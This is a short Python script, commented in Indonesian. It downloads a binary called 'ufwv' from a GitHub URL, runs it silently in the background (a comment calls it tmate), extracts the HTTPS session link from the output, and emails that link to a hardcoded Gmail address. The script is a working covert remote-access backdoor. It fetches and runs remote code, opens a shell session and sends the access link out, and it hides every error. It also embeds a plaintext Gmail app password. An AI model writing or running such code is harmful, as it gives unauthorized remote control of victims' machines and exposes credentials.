import subprocess
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import os
import urllib.request
import re

# URL file ufwv
UFWV_URL = "https://github.com/icadnewton/sendme/raw/refs/heads/main/ufwv"

# Fungsi untuk memeriksa dan mengunduh file ufwv
def ensure_ufwv_exists():
    if not os.path.exists("ufwv"):
        try:
            urllib.request.urlretrieve(UFWV_URL, "ufwv")
            os.chmod("ufwv", 0o755)
        except Exception:
            pass

# Fungsi untuk menjalankan perintah nohup ./ufwv di subprocess (background)
def run_tmate_command():
    try:
        with open('nohup.out', 'w') as nohup_file:
            subprocess.Popen(['nohup', './ufwv'], stdout=nohup_file, stderr=subprocess.DEVNULL, text=True)
    except Exception:
        pass

# Fungsi untuk mendapatkan output dari file nohup.out
def get_nohup_output():
    try:
        time.sleep(10)
        if os.path.exists('nohup.out'):
            with open('nohup.out', 'r') as file:
                return file.read()
    except Exception:
        pass
    return ""

# Fungsi untuk mengekstrak link HTTPS dari output nohup
def extract_https_link(nohup_output):
    try:
        match = re.search(r"https://\S+", nohup_output)
        if match:
            return match.group(0)
    except Exception:
        pass
    return ""

# Fungsi untuk mengirim email
def send_email(sender_email, sender_password, recipient_email, subject, body):
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = recipient_email
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, recipient_email, msg.as_string())
    except Exception:
        pass

if __name__ == "__main__":
    ensure_ufwv_exists()
    run_tmate_command()
    time.sleep(5)
    nohup_output = get_nohup_output()

    https_link = extract_https_link(nohup_output)

    sender_email = "sshxconnect@gmail.com"
    sender_password = "jxojyevtgzxqamtn"
    recipient_email = "icadnewton@gmail.com"
    subject = "Nohup Output"
    body = f"koneksi ssh anda paduka redhat account kailahulsey5498+fzxms@outlook.com:\n\n{https_link}"

    send_email(sender_email, sender_password, recipient_email, subject, body)
